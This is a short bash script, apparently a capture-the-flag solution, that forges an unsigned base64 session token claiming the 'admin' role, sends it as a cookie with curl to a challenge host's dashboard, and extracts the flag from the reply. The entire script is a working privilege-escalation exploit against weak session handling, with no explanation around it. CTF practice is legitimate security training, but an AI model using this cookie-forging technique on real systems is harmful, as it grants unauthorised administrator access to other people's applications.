#!/usr/bin/env bash
set -euo pipefail

if [ "${1:-}" = "-h" ] || [ "${1:-}" = "--help" ]; then
  printf 'Usage: %s [base_url]\n' "$0"
  exit 0
fi

target="${1:-https://a3588f2a685c1d0b.chal.ctf.ae}"
payload='{"user":"guest","role":"admin","iat":0}'
token="$(printf '%s' "$payload" | base64 -w0)"

response="$(
  curl -k -sS \
    -b "session_token=${token}" \
    "${target%/}/dashboard"
)"

flag="$(printf '%s' "$response" | grep -o 'flag{[^}]*}' | head -n 1 || true)"
if [ -n "$flag" ]; then
  printf '%s\n' "$flag"
else
  printf '%s\n' "$response"
fi
